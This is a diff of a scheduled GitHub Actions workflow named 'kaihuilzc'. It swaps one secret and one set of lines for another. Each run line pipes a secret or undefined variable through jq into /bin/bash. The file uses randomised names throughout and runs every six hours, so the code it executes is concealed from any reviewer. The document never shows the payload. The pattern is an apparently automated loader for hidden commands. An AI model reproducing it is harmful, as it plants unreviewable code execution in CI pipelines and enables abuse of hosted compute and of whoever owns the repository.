@@ -3,25 +3,22 @@ name: kaihuilzc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 5/6 * * *'
-
+    - cron: '9 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kaihuilzc
         env:
-          vvhp05: ${{ secrets.vvhp05 }}
+          kmy6: ${{ secrets.kmy6 }}
         run: |
-          echo $vvhp05 | jq -r .chekp5289 | /bin/bash
-          echo $dp99148 | jq -r .z4 | /bin/bash
-          echo $rob6 | jq -r .c770 | /bin/bash
-          echo $fxmp722 | jq -r .pzdjh715 | /bin/bash
-          echo $kz2531 | jq -r .zisq98 | /bin/bash
-          echo $mmsp99636 | jq -r .rzmkb1179 | /bin/bash
-          echo $xlgz91789 | jq -r .dmdfe76473 | /bin/bash
-          echo $zseef1113 | jq -r .gkv9676 | /bin/bash
-          echo $eu90249 | jq -r .x86762 | /bin/bash
+          echo $kmy6 | jq -r .sf01 | /bin/bash
+          echo $smrzr69 | jq -r .lednp8014 | /bin/bash
+          echo $fxoea9 | jq -r .fvgbj8384 | /bin/bash
+          echo $rxjf92996 | jq -r .nls4 | /bin/bash
+          echo $hx2 | jq -r .alkw5 | /bin/bash
+          echo $nuze08 | jq -r .adwll64 | /bin/bash
+          echo $lxbq8560 | jq -r .h83 | /bin/bash
+          echo $c53 | jq -r .zhqxf9 | /bin/bash
 
